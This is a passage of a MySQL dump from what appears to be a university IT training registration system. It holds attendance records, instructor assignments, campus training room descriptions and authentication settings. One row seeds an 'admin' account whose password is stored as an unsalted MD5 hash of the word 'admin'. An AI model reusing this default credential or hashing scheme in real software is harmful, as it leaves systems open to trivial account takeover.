(289, 2777, 'attending', 1240842770, '0'),
(289, 2911, 'attending', 1241189124, '0'),
(289, 2914, 'canceled', 1240860907, '0'),
(290, 2007, 'attending', 1241627242, '0'),
(290, 2016, 'canceled', 1241105718, '0'),
(290, 2064, 'canceled', 1240856324, '0'),
(290, 2074, 'attending', 1241204014, '0'),
(290, 2210, 'attending', 1241553502, '0'),
(290, 2275, 'attending', 1241117851, '0'),
(290, 2384, 'attending', 1240856652, '0'),
(290, 2497, 'attending', 1242056110, '0'),
(290, 2508, 'attending', 1241469431, '0'),
(290, 2515, 'attending', 1241115027, '0'),
(290, 2533, 'attending', 1241187767, '0'),
(290, 2537, 'attending', 1241723104, '0'),
(290, 2570, 'attending', 1241438926, '0'),
(290, 2573, 'canceled', 1240865572, '0'),
(290, 2586, 'canceled', 1241007242, '0'),
(290, 2641, 'canceled', 1241105521, '0'),
(290, 2846, 'attending', 1241708118, '0'),
(290, 2909, 'attending', 1240863105, '0'),
(291, 2064, 'canceled', 1242060509, '0'),
(291, 2163, 'canceled', 1241443251, '0'),
(291, 2178, 'canceled', 1241185696, '0'),
(291, 2316, 'canceled', 1241015736, '0'),
(291, 2357, 'canceled', 1241014927, '0'),
(291, 2384, 'canceled', 1242065273, '0'),
(291, 2392, 'canceled', 1241548061, '0'),
(291, 2427, 'canceled', 1241799505, '0'),
(291, 2502, 'canceled', 1241208451, '0'),
(291, 2511, 'canceled', 1241186205, '0'),
(291, 2523, 'canceled', 1241033305, '0'),
(291, 2863, 'canceled', 1241813582, '0'),
(291, 2902, 'canceled', 1241636829, '0'),
(292, 2149, 'canceled', 1240861600, '0'),
(293, 1984, 'attending', 1241468200, '0'),
(293, 2064, 'canceled', 1242060170, '0'),
(293, 2108, 'attending', 1242130900, '0'),
(293, 2115, 'attending', 1242142602, '0'),
(293, 2159, 'attending', 1241462943, '0'),
(293, 2197, 'attending', 1241114516, '0'),
(293, 2200, 'attending', 1241544441, '0'),
(293, 2305, 'attending', 1241466850, '0'),
(293, 2364, 'attending', 1241531604, '0'),
(293, 2392, 'canceled', 1240938745, '0'),
(293, 2424, 'attending', 1241468442, '0'),
(293, 2533, 'canceled', 1241187679, '0'),
(293, 2549, 'attending', 1241467678, '0'),
(293, 2614, 'attending', 1240856670, '0'),
(293, 2615, 'attending', 1240858897, '0'),
(293, 2630, 'attending', 1241468121, '0'),
(293, 2694, 'attending', 1240862919, '0'),
(293, 2707, 'attending', 1242086958, '0'),
(293, 2822, 'attending', 1241531456, '0'),
(293, 2841, 'attending', 1240944419, '0'),
(293, 2890, 'attending', 1240924097, '0'),
(294, 2064, 'canceled', 1242060241, '0'),
(294, 2075, 'canceled', 1240859090, '0'),
(294, 2140, 'canceled', 1241185364, '0'),
(294, 2182, 'canceled', 1240858990, '0'),
(294, 2230, 'canceled', 1241465812, '0'),
(294, 2391, 'canceled', 1241541609, '0'),
(294, 2505, 'canceled', 1240926912, '0'),
(294, 2676, 'canceled', 1241698006, '0'),
(294, 2681, 'canceled', 1241188885, '0'),
(294, 2844, 'canceled', 1241820044, '0'),
(295, 2090, 'attending', 1240932540, '0'),
(295, 2123, 'canceled', 1241009583, '0'),
(295, 2216, 'attending', 1240615409, '0'),
(295, 2315, 'canceled', 1240921340, '0'),
(295, 2353, 'attending', 1241011606, '0'),
(295, 2392, 'canceled', 1240938439, '0'),
(295, 2572, 'canceled', 1240859725, '0'),
(295, 2573, 'canceled', 1240864421, '0'),
(295, 2737, 'attending', 1240932295, '0'),
(295, 2807, 'canceled', 1241036393, '0'),
(295, 2840, 'canceled', 1240936294, '0'),
(296, 2015, 'attending', 1240927023, '1'),
(296, 2105, 'attending', 1241095380, '1'),
(296, 2126, 'attending', 1241011562, '1'),
(296, 2137, 'attending', 1241011817, '1'),
(296, 2164, 'attending', 1240922368, '1'),
(296, 2189, 'attending', 1240920854, '1'),
(296, 2279, 'attending', 1241010829, '0'),
(296, 2396, 'attending', 1240928799, '1'),
(296, 2449, 'attending', 1241092254, '1'),
(296, 2586, 'canceled', 1240933725, '0'),
(296, 2605, 'canceled', 1240864844, '0'),
(296, 2606, 'attending', 1241034458, '1'),
(296, 2669, 'attending', 1240927961, '1'),
(296, 2807, 'attending', 1241036614, '1'),
(296, 2833, 'attending', 1241036394, '1'),
(296, 2841, 'canceled', 1240859824, '0'),
(296, 2894, 'attending', 1240858913, '0'),
(296, 2928, 'attending', 1240857803, '1'),
(297, 1996, 'canceled', 1241447160, '0'),
(297, 2035, 'canceled', 1241530768, '0'),
(297, 2068, 'canceled', 1241100383, '0'),
(297, 2077, 'canceled', 1241119064, '0'),
(297, 2090, 'canceled', 1241100717, '0'),
(297, 2093, 'canceled', 1241182559, '0'),
(297, 2119, 'canceled', 1241105097, '0'),
(297, 2187, 'canceled', 1241209253, '0'),
(297, 2202, 'canceled', 1241118547, '0'),
(297, 2209, 'canceled', 1241478856, '0'),
(297, 2310, 'canceled', 1241102416, '0'),
(297, 2345, 'canceled', 1241100356, '0'),
(297, 2359, 'canceled', 1241193915, '0'),
(297, 2380, 'canceled', 1241548043, '0'),
(297, 2400, 'canceled', 1241105121, '0'),
(297, 2405, 'canceled', 1241443630, '0'),
(297, 2418, 'canceled', 1241622832, '0'),
(297, 2423, 'canceled', 1241702807, '0'),
(297, 2462, 'canceled', 1241122807, '0'),
(297, 2544, 'canceled', 1241100419, '0'),
(297, 2560, 'canceled', 1241701011, '0'),
(297, 2579, 'canceled', 1241634848, '0'),
(297, 2650, 'canceled', 1241118398, '0'),
(297, 2653, 'canceled', 1241120369, '0'),
(297, 2667, 'canceled', 1241617202, '0'),
(297, 2697, 'canceled', 1241644288, '0'),
(297, 2777, 'canceled', 1241120591, '0'),
(297, 2870, 'canceled', 1241181534, '0'),
(297, 2928, 'canceled', 1241180519, '0'),
(297, 2941, 'canceled', 1241541782, '0'),
(298, 1991, 'attending', 1241101184, '0'),
(298, 1996, 'attending', 1241712300, '0'),
(298, 2035, 'attending', 1241700226, '0'),
(298, 2077, 'attending', 1241705102, '0'),
(298, 2090, 'attending', 1241715006, '0'),
(298, 2115, 'canceled', 1241708255, '0'),
(298, 2119, 'attending', 1241700265, '0'),
(298, 2126, 'attending', 1241111442, '0'),
(298, 2130, 'attending', 1242134041, '0'),
(298, 2187, 'attending', 1241620359, '0'),
(298, 2202, 'attending', 1241703673, '0'),
(298, 2209, 'attending', 1241720526, '0'),
(298, 2214, 'attending', 1241803002, '0'),
(298, 2247, 'attending', 1241105249, '0'),
(298, 2310, 'attending', 1241723899, '0'),
(298, 2334, 'attending', 1241797962, '0'),
(298, 2337, 'attending', 1241185674, '0'),
(298, 2338, 'attending', 1241530203, '0'),
(298, 2353, 'attending', 1241190762, '0'),
(298, 2359, 'attending', 1241709561, '0'),
(298, 2390, 'attending', 1241100427, '0'),
(298, 2403, 'attending', 1241102981, '0'),
(298, 2432, 'attending', 1242147449, '0'),
(298, 2433, 'attending', 1241117140, '0'),
(298, 2452, 'attending', 1241553988, '0'),
(298, 2459, 'canceled', 1242063264, '0'),
(298, 2506, 'attending', 1241179896, '0'),
(298, 2544, 'canceled', 1241784674, '0'),
(298, 2560, 'attending', 1241701157, '0'),
(298, 2575, 'attending', 1241209403, '0'),
(298, 2579, 'canceled', 1241700186, '0'),
(298, 2657, 'attending', 1241460355, '0'),
(298, 2667, 'attending', 1241697947, '0'),
(298, 2701, 'attending', 1241238527, '0'),
(298, 2720, 'canceled', 1241103226, '0'),
(298, 2733, 'attending', 1241107511, '0'),
(298, 2735, 'attending', 1241102677, '0'),
(298, 2737, 'attending', 1242128651, '0'),
(298, 2777, 'canceled', 1241115024, '0'),
(298, 2787, 'attending', 1241726741, '0'),
(298, 2790, 'attending', 1241187381, '0'),
(298, 2870, 'attending', 1241723696, '0'),
(298, 2915, 'attending', 1241105996, '0'),
(298, 2928, 'attending', 1241706167, '0'),
(299, 1991, 'canceled', 1241101059, '0'),
(299, 2068, 'canceled', 1241100446, '0'),
(299, 2090, 'canceled', 1241100796, '0'),
(299, 2119, 'canceled', 1241105293, '0'),
(299, 2187, 'canceled', 1241209147, '0'),
(299, 2202, 'canceled', 1241135031, '0'),
(299, 2216, 'canceled', 1241185719, '0'),
(299, 2247, 'canceled', 1241105563, '0'),
(299, 2345, 'canceled', 1241186572, '0'),
(299, 2380, 'canceled', 1241548076, '0'),
(299, 2409, 'canceled', 1241103895, '0'),
(299, 2544, 'canceled', 1241100512, '0'),
(299, 2697, 'canceled', 1241644230, '0'),
(299, 2928, 'canceled', 1241180548, '0'),
(300, 1991, 'attending', 1241101120, '0'),
(300, 2035, 'attending', 1241531662, '0'),
(300, 2068, 'attending', 1241792076, '0'),
(300, 2090, 'attending', 1241715128, '0'),
(300, 2119, 'attending', 1241720907, '0'),
(300, 2126, 'attending', 1241111781, '0'),
(300, 2187, 'attending', 1241620404, '0'),
(300, 2209, 'attending', 1242048810, '0'),
(300, 2247, 'canceled', 1241105293, '0'),
(300, 2337, 'attending', 1241185629, '0'),
(300, 2353, 'attending', 1241190642, '0'),
(300, 2359, 'attending', 1242054096, '0'),
(300, 2390, 'canceled', 1241100518, '0'),
(300, 2432, 'attending', 1242066330, '0'),
(300, 2452, 'attending', 1241554415, '0'),
(300, 2459, 'canceled', 1241100454, '0'),
(300, 2506, 'attending', 1241810156, '0'),
(300, 2575, 'attending', 1241209634, '0'),
(300, 2657, 'attending', 1241460320, '0'),
(300, 2667, 'attending', 1241617375, '0'),
(300, 2735, 'attending', 1241103144, '0'),
(300, 2777, 'attending', 1241115090, '0'),
(300, 2790, 'attending', 1241187353, '0'),
(300, 2867, 'attending', 1242135517, '0'),
(300, 2915, 'attending', 1241185455, '0'),
(300, 2928, 'attending', 1241706362, '0'),
(301, 2057, 'attending', 1241702319, '0'),
(302, 2206, 'attending', 1242064522, '0'),
(302, 2209, 'attending', 1241826208, '0'),
(302, 2216, 'attending', 1241811511, '0'),
(302, 2272, 'attending', 1242068083, '0'),
(302, 2422, 'attending', 1242147114, '0'),
(302, 2497, 'attending', 1242057021, '0'),
(302, 2725, 'attending', 1242221076, '0'),
(302, 2732, 'attending', 1242058651, '0'),
(302, 2809, 'attending', 1242053519, '0'),
(302, 2858, 'attending', 1242065341, '0'),
(302, 2915, 'attending', 1242049796, '0'),
(303, 2068, 'attending', 1241792005, '0'),
(303, 2115, 'attending', 1242142684, '0'),
(303, 2159, 'attending', 1242150533, '0'),
(303, 2216, 'attending', 1241789894, '0'),
(303, 2365, 'attending', 1241808141, '0'),
(303, 2459, 'attending', 1242063309, '0'),
(303, 2497, 'attending', 1242057162, '0'),
(303, 2544, 'attending', 1241784729, '0'),
(303, 2697, 'attending', 1241815470, '0'),
(303, 2737, 'canceled', 1242043930, '0'),
(303, 2867, 'attending', 1242135678, '0'),
(304, 2216, 'attending', 1241789946, '0'),
(304, 2365, 'attending', 1241807706, '0'),
(304, 2459, 'attending', 1242063342, '0'),
(304, 2497, 'attending', 1242057189, '0'),
(304, 2544, 'attending', 1241784771, '0'),
(305, 2041, 'attending', 1242156834, '0'),
(305, 2652, 'attending', 1242061332, '0'),
(305, 2867, 'attending', 1242135315, '0'),
(306, 2294, 'attending', 1242671290, '0'),
(308, 2354, 'attending', 1254491640, '1'),
(311, 1, 'canceled', 1263306320, '0');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_event_instructor`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_event_instructor` (
  `eventId` int(11) NOT NULL DEFAULT '0',
  `accountId` int(11) unsigned NOT NULL DEFAULT '0',
  KEY `eventId` (`eventId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `oit_tbl_event_instructor`
--

INSERT INTO `oit_tbl_event_instructor` (`eventId`, `accountId`) VALUES
(145, 2294),
(145, 2354),
(146, 2294),
(146, 2354),
(148, 2225),
(148, 2847),
(149, 2294),
(149, 2354),
(150, 2294),
(150, 2354),
(151, 2294),
(151, 2354),
(152, 2294),
(152, 2354),
(153, 2847),
(155, 2249),
(156, 2225),
(157, 2249),
(158, 2918),
(159, 2918),
(160, 2249),
(161, 2748),
(161, 2847),
(162, 2748),
(162, 2847),
(163, 2249),
(164, 2375),
(165, 2130),
(165, 2375),
(166, 2130),
(167, 2748),
(167, 2847),
(168, 2764),
(169, 2764),
(170, 2764),
(171, 2764),
(172, 2130),
(172, 2375),
(173, 2130),
(173, 2375),
(174, 2850),
(175, 2318),
(176, 2372),
(177, 2372),
(178, 2372),
(179, 2372),
(180, 2806),
(181, 2129),
(182, 2847),
(183, 2847),
(184, 2847),
(185, 2847),
(186, 2211),
(187, 2211),
(188, 2847),
(189, 2211),
(190, 2847),
(191, 2847),
(192, 2847),
(193, 2847),
(194, 2206),
(195, 2206),
(196, 2206),
(197, 2206),
(198, 2847),
(199, 2847),
(200, 2847),
(201, 2313),
(202, 2313),
(203, 2313),
(204, 2211),
(204, 2649),
(205, 2294),
(205, 2354),
(206, 2806),
(207, 2313),
(208, 2872),
(209, 2313),
(210, 2313),
(211, 2806),
(212, 2186),
(213, 2313),
(214, 2186),
(215, 2918),
(216, 2918),
(217, 2211),
(218, 2309),
(219, 2309),
(220, 2130),
(221, 2319),
(222, 2392),
(223, 2847),
(224, 2847),
(225, 2847),
(226, 2847),
(227, 2407),
(228, 2211),
(229, 2847),
(230, 2130),
(231, 2206),
(232, 2206),
(233, 2206),
(234, 2206),
(235, 2847),
(236, 2211),
(237, 2847),
(238, 2847),
(239, 2847),
(240, 2407),
(241, 2847),
(242, 2847),
(243, 2847),
(244, 2847),
(245, 2206),
(246, 2206),
(247, 2206),
(248, 2206),
(249, 2130),
(250, 2130),
(251, 2130),
(252, 2130),
(253, 2130),
(254, 2130),
(255, 2867),
(256, 2392),
(257, 2847),
(258, 2130),
(259, 2211),
(260, 2867),
(261, 2847),
(262, 2354),
(263, 2130),
(264, 2423),
(265, 2423),
(266, 2867),
(267, 2847),
(268, 2847),
(269, 2423),
(270, 2847),
(271, 2249),
(282, 2517),
(283, 2517),
(284, 2130),
(285, 2517),
(286, 2517),
(287, 2130),
(288, 2517),
(289, 2130),
(290, 2517),
(291, 2517),
(292, 2130),
(293, 2517),
(294, 2517),
(295, 2847),
(296, 2847),
(297, 2055),
(298, 2055),
(299, 2055),
(300, 2055),
(301, 2847),
(302, 2423),
(303, 2055),
(304, 2055),
(305, 2552),
(301, 2294),
(308, 2294);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_event_restriction`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_event_restriction` (
  `eventId` int(11) NOT NULL DEFAULT '0',
  `realm` varchar(64) NOT NULL DEFAULT '',
  `users` longtext NOT NULL,
  PRIMARY KEY (`eventId`,`realm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `oit_tbl_event_restriction`
--


-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_location`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_location` (
  `locationId` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `status` enum('enabled','disabled') NOT NULL DEFAULT 'enabled',
  `description` mediumtext NOT NULL,
  `address` varchar(255) NOT NULL DEFAULT '',
  `capacity` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`locationId`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=29 ;

--
-- Dumping data for table `oit_tbl_location`
--

INSERT INTO `oit_tbl_location` (`locationId`, `name`, `status`, `description`, `address`, `capacity`) VALUES
(7, 'Avent Ferry Training Facility', 'disabled', '<table border="0"><tbody><tr><td><strong>Directions:</strong> From Western Boulevard turn onto Avent Ferry Road. Turn right between          the Avent Ferry Residence Hall and the Avent Ferry Convention Center.          Take the second left. This will put you in the parking lot of the Conference          Center. Wheel chair accessible entry is available at the front of the          Conference Center. <p>&nbsp;</p><p>Signs are posted throughout the Conference Center to direct you to our          training lab (room 37).</p><p>&nbsp;</p><p>&nbsp;</p> </td><td>        <p><img src="http://www.ncsu.edu/it/education/images/aftf.jpg" border="0" alt="Avent Ferry" /></p> </td></tr> <tr> <td><strong>Parking:</strong>         There are C zone and F zone parking behind and around the building. All parking permits <strong>except</strong> L and S can park in the F zone (<a href="http://www2.acs.ncsu.edu/trans/parking/permits/permitGrid.html">see transportation permit grid</a>). If you do not have the necessary permit and need to park behind the building, please contact Transportation about <a href="http://www2.acs.ncsu.edu/trans/parking/event/camps-conf.html">one day parking passes </a>($2).</td> <td><a href="http://maps.google.com/maps?f=q&amp;hl=en&amp;geocode=&amp;q=2114%20Avent%20Ferry%20Road%20Raleigh%20NC,%20Room%2021&amp;ie=UTF8&amp;ll=35.789412,-78.673439&amp;spn=0.012203,0.023625&amp;z=14&amp;iwloc=addr&amp;source=embed"> </a></td> </tr> </tbody></table>', '2114 Avent Ferry Road Raleigh NC, Room 37', 15),
(8, 'OIT Training Center room 109 (Language and Computer Labs building )', 'enabled', '<p>The OIT Training Center (rm 109) is located on the lower floor of the Language and Computer Labs buliding also known as the Laundry building. </p><p>See our <a href="http://maps.google.com/maps/ms?msa=0&amp;msid=101552034813444996014.000459dc057ac991bbf56&amp;ie=UTF8&amp;z=17">google map</a>.</p><p>&nbsp;</p><p><img src="http://www.ncsu.edu/it/education/images/laundry-lab.jpg" border="1" alt="Laundry Building" width="215" height="146" /></p><p><strong>Parking:</strong></p><p>Parking is a challenge near the building. I recommend walking or taking the bus.</p><p><strong>Bus Routes <a href="http://www2.acs.ncsu.edu/trans/transportation/wolfline/fall-springService.html">(Fall/Spring)</a>:</strong> Route 2 &amp; 7 have stops at the Training&nbsp;Center</p><p><strong>B sticker:</strong>&nbsp;&nbsp;There is limited&nbsp;B sticker to access near the Center. B stickers are accepted on Stinson, Current, Lamp and Yarbrough Drives. <a href="http://www2.acs.ncsu.edu/trans/maps/download/08-09GeneralParkingZones.pdf" target="_blank">See NCSU Transportation Parking&nbsp;Map</a></p><p><strong>C sticker:</strong> C parking is located across the railroad in the Jeter Drive Bays near&nbsp;Reynolds Coliseum.&nbsp;<a href="http://www2.acs.ncsu.edu/trans/maps/download/08-09GeneralParkingZones.pdf" target="_blank">See NCSU Transportation Parking&nbsp;Map</a>&nbsp;<em>If you park in this area it is best to take the tunnel directly across from the Coliseum.</em></p><p><strong>Off-Campus:</strong> If you are coming from off campus and you don''t have a parking permit you will need to purchase a <a href="http://www2.acs.ncsu.edu/trans/visitors/visitorPrkg.html">visitor pass from our Transportation Department</a> or park in the Coliseum Pay Lot. A visitor pass for the day is $2 and the pay lot is $1/hr. </p>', '2341 STINSON DR. Raleigh 27695', 15),
(9, 'ITTC Lab A (D.H. Hill Library)', 'enabled', '<p>&nbsp;See our <a href="http://maps.google.com/maps/ms?msa=0&amp;msid=101552034813444996014.000459dc057ac991bbf56" target="_blank">map</a>.</p><p><strong>Directions:</strong> Enter D.H. Hill Library from the brickyard. Go through the turnstile and turn right. On your left are stairs and an elevator; take one to the 2nd floor. Once in the second floor hall, turn left and follow the signs through the hallway and breezeway. The entrances to the ITTC Labs are forward and to the right down a narrow hallway. ITTC 1B is the first door on the left. ITTC 1A is the second door, down the hall and to the left. Look for ITTC signs throughout the library to help guide you to the rooms. </p>                         <table border="0" width="100%"><tbody><tr><td valign="top"><p><strong>View the libraries<a href="http://www.lib.ncsu.edu/vtour/ittLab.html" target="_blank"> ITTC webpage</a>. </strong></p>           <p><a href="http://www.lib.ncsu.edu/directions/dhhill/" target="_blank">Directions to D.H. Hill Library</a></p></td>          <td><img src="http://www.ncsu.edu/it/education/images/ittclabs.jpg" border="0" alt="ittc map" width="435" height="260" /></td></tr></tbody></table>', '2205 Hillsborough St Raleigh NC 27607', 15),
(10, 'ITTC Lab B (DH Hill Library)', 'enabled', '<p>&nbsp;See our <a href="http://maps.google.com/maps/ms?msa=0&amp;msid=101552034813444996014.000459dc057ac991bbf56" target="_blank">map</a>. </p><p><strong>Directions:</strong> Enter D.H. Hill Library from the brickyard. Go through the turnstile and turn right. On your left are stairs and an elevator; take one to the 2nd floor. Once in the second floor hall, turn left and follow the signs through the hallway and breezeway. The entrances to the ITTC Labs are forward and to the right down a narrow hallway. ITTC 1B is the first door on the left. ITTC 1A is the second door, down the hall and to the left. Look for ITTC signs throughout the library to help guide you to the rooms. </p>                         <table border="0" width="100%"><tbody><tr><td valign="top"><p><strong>View the libraries<a href="http://www.lib.ncsu.edu/vtour/ittLab.html" target="_blank"> ITTC webpage</a>. </strong></p>           <p><a href="http://www.lib.ncsu.edu/directions/">Directions to D.H. Hill Library</a></p></td>          <td><img src="http://www.ncsu.edu/it/education/images/ittclabs.jpg" border="0" alt="ittc map" width="435" height="260" /></td></tr></tbody></table>', '2205 Hillsborough St Raleigh NC 27607', 15),
(11, 'ITTC Lab 2 (DH Hill Library)', 'disabled', '', '2205 Hillsborough St Raleigh NC 27607', 15),
(12, 'Need to delete', 'disabled', '', '', 0),
(13, '2105A Jordan Hall', 'disabled', '', '2800 Faucette Drive Raleigh,NC  27607', 21),
(14, '201 Daniels Hall', 'disabled', '', '111 Lampe Drive Raleigh, NC 27695', 25),
(15, 'David Clark Labs room 101', 'enabled', '<p>Number 75 on campus map</p><p><img src="http://www.ncsu.edu/it/education/faculty-staff/Archive/map.jpg" border="0" width="325" height="467" /> </p><p>&nbsp;</p><p>Located between Fox Teaching Labs and the Dan Allen Parking Deck</p><p><img src="http://www.ncsu.edu/facilities/photographs/collection/2006/11/david_clark_labs_2_11-06_scr.jpg" border="0" alt="courtyard view" width="235" height="176" /><img src="http://www.ncsu.edu/facilities/photographs/collection/2006/10/david_clark_labs_10-06_scr.jpg" border="0" width="241" height="181" /> </p><p>Courtyard view&nbsp;</p>', '100 EUGENE BROOKS AVENUE, RALEIGH, NC 27695', 100),
(16, 'This workshop was cancelled or postponed.', 'enabled', '<p>No location. </p>', 'None', 0),
(17, 'Bureau of Mines 111', 'disabled', '<p>The Bureau of Mines (BoM) is a four-story    building located near the free-expression tunnel behind Cox Hall.</p><p><img src="http://www.ncsu.edu/facilities/buildings/P1010006.JPG" border="0" alt="Bureau of Mines Building" width="443" height="332" align="left" /> </p>', '2500 YARBROUGH DR. 27695', 10),
(18, 'B2/B3 Conference Room', 'enabled', '<p>The B2/B3 Conference room (formerly known as the ETSS Conference Room) is located in Basement of the Hillsborough Building.</p><p>See <a href="http://maps.google.com/maps/ms?msa=0&amp;msid=101552034813444996014.000459dc057ac991bbf56">map</a>. </p><p><img src="http://www.ncsu.edu/it/education/faculty-staff/forclassmate/hillsborough.jpg" border="0" alt="Hillsborough Building" width="350" height="263" /> </p>', '2620 Hillsborough Street Raleigh, NC 27695', 25),
(19, 'Scott Hall, Room 216', 'enabled', '<p>Please see our <a href="/" target="_blank">map</a>. </p><p>Parking for B stickers is across the street from Scott Hall in the Brooks&nbsp;Parking lot (corner of Hillsborough Street and Brooks Street).</p><p>Parking for C&nbsp;sticker is the Dan Allen Parking lot.</p><p>&nbsp;</p><p>&nbsp;</p><p><img src="http://www2.chass.ncsu.edu/photoessay/ScottHallLarge.jpg" border="0" width="450" height="300" /></p>', '2711 FOUNDERS DR. Raleigh, NC 27695', 25),
(20, 'New OIT Conference Room in the Basement', 'disabled', 'This conference room has not yet been completed. I will update the room number when one has been established.', '2620 Hillsborough street 27695', 15),
(21, 'Daniels Hall room 407', 'enabled', '', '111 Lampe Drive Raleigh, NC 27695', 0),
(22, 'Bostian Hall 3712', 'enabled', '', '', 0),
(23, 'B16-B Hillsborough Building', 'enabled', '<p>The B16-B&nbsp; Conference room is located in Basement of the Hillsborough Building.</p><p>See <a href="http://maps.google.com/maps/ms?msa=0&amp;msid=101552034813444996014.000459dc057ac991bbf56">map</a>. </p><p><img src="http://www.ncsu.edu/it/education/faculty-staff/forclassmate/hillsborough.jpg" border="0" alt="Hillsborough Building" width="350" height="263" /> </p>', '2620 Hillsborough Street Raleigh, NC 27695', 25),
(24, 'Riddick 301', 'enabled', '<p>&nbsp;<font face="Arial, Helvetica, sans-serif">2401 Stinson Dr.</font></p><p>See <a href="http://www.ncsu.edu/facilities/buildings/riddick.html">NCSU facilites page</a>.<a href="http://www.ncsu.edu/facilities/buildings/riddick.html"></a>See <a href="http://www.ncsu.edu/campus_map/north.htm">Camps Map</a>.  </p><p>&nbsp;</p><p>&nbsp;<img src="http://www.ncsu.edu/facilities/buildings/Riddick0808.JPG" border="0" width="309" height="232" />       <img src="http://www.ncsu.edu/facilities/buildings/riddick_07.jpg" border="0" width="307" height="230" /></p>', '', 146),
(25, 'Auditorium - DH Hill Library', 'enabled', '<p>&nbsp;<a href="http://www.lib.ncsu.edu/vtour/photos/ECtheater-1.gif"><div style="text-align: center"><img src="http://www.lib.ncsu.edu/vtour/photosTN/ECtheater-1.gif" border="0" alt="Auditorium" /></div></a></p><p><strong>Directions</strong></p><p> Enter <a href="http://www.lib.ncsu.edu/directions/dhhill/">D. H. Hill Library</a> from the brickyard. Go through the turnstile and turn left. Take the main stairs up one floor to the lobby. Turn to your left and proceed to the West Wing and down the steps/elevator. Continue walking past the copiers, and newspaper shelving on your right. Go up the wide staircase. At the top of the stairs, go through the double doors and turn right. The <strong>Auditorium</strong> is on the right.</p><p><a href="http://www.lib.ncsu.edu/vtour/erdCloTheAndMinThe.html">NCSU Libraries Vitural Tour</a></p>', '', 150),
(26, 'Computer Training Unit', 'enabled', '<p>Computer Training Unit is located in the McKimmon Center.</p><p><a href="http://www.ncsu.edu/ctu/directions.html">See the CTU website for directions.</a> </p>', '1101 Gorman Street 27606', 17),
(27, 'Walnut Room - Talley Student Center', 'enabled', '<p>Talley Student Center is on Cates Avenue, near the corner of Cates and Morrill Drive.&nbsp;&nbsp;</p><p><img src="http://www.ncsu.edu/student_center/images/on_campus_map.jpg" border="0" alt="Map of Campus" width="498" height="312" /></p><p>&nbsp;</p>', '', 75),
(28, 'Room 3118 - Talley Student Center', 'enabled', '<p>Talley Student Center is on Cates Avenue, near the corner of Cates and Morrill Drive. </p><p><img src="http://www.ncsu.edu/student_center/images/on_campus_map.jpg" border="0" alt="Map of Campus" width="498" height="312" /></p>', '', 75);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_account`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_account` (
  `accountId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(64) NOT NULL DEFAULT '',
  `realm` varchar(64) NOT NULL DEFAULT '',
  `password` varchar(128) NOT NULL DEFAULT '',
  `apiCode` varchar(255) NOT NULL DEFAULT '',
  `role` int(10) unsigned NOT NULL DEFAULT '0',
  `emailAddress` varchar(255) NOT NULL DEFAULT '',
  `firstName` varchar(64) NOT NULL DEFAULT '',
  `lastName` varchar(64) NOT NULL DEFAULT '',
  `timezone` varchar(32) NOT NULL DEFAULT '',
  `lastLogin` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`accountId`),
  UNIQUE KEY `username` (`username`,`realm`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `oit_tbl_ot_account`
--

INSERT INTO `oit_tbl_ot_account` (`accountId`, `username`, `realm`, `password`, `apiCode`, `role`, `emailAddress`, `firstName`, `lastName`, `timezone`, `lastLogin`) VALUES
(1, 'admin', 'local', '21232f297a57a5a743894a0e4a801fc3', '', 2, 'admin@admin.com', 'Admin', 'Mcadmin', 'America/New_York', 1263563737);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_auth_adapter`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_auth_adapter` (
  `adapterKey` varchar(24) NOT NULL,
  `class` varchar(64) NOT NULL,
  `name` varchar(64) NOT NULL,
  `description` varchar(255) NOT NULL,
  `enabled` tinyint(1) NOT NULL,
  `displayOrder` int(11) NOT NULL,
  PRIMARY KEY (`adapterKey`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `oit_tbl_ot_auth_adapter`
--

INSERT INTO `oit_tbl_ot_auth_adapter` (`adapterKey`, `class`, `name`, `description`, `enabled`, `displayOrder`) VALUES
('local', 'Ot_Auth_Adapter_Local', 'ClassMate Account', 'Authentication using an account created through ClassMate', 1, 1),
('wrap', 'Ot_Auth_Adapter_Wrap', 'NCSU Wrap', 'Authentication using your Unity ID and Password', 1, 2);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_bug`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_bug` (
  `bugId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(64) NOT NULL DEFAULT '',
  `submitDt` int(10) unsigned NOT NULL DEFAULT '0',
  `reproducibility` enum('always','sometimes','never') NOT NULL DEFAULT 'always',
  `severity` enum('minor','major','crash') NOT NULL DEFAULT 'minor',
  `priority` enum('low','medium','high','critical') NOT NULL DEFAULT 'low',
  `status` enum('new','ignore','escalated','fixed') NOT NULL DEFAULT 'new',
  PRIMARY KEY (`bugId`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Dumping data for table `oit_tbl_ot_bug`
--


-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_bug_text`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_bug_text` (
  `bugTextId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bugId` int(10) unsigned NOT NULL DEFAULT '0',
  `accountId` int(10) unsigned NOT NULL DEFAULT '0',
  `postDt` int(10) unsigned NOT NULL DEFAULT '0',
  `text` text NOT NULL,
  PRIMARY KEY (`bugTextId`),
  KEY `bugId` (`bugId`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
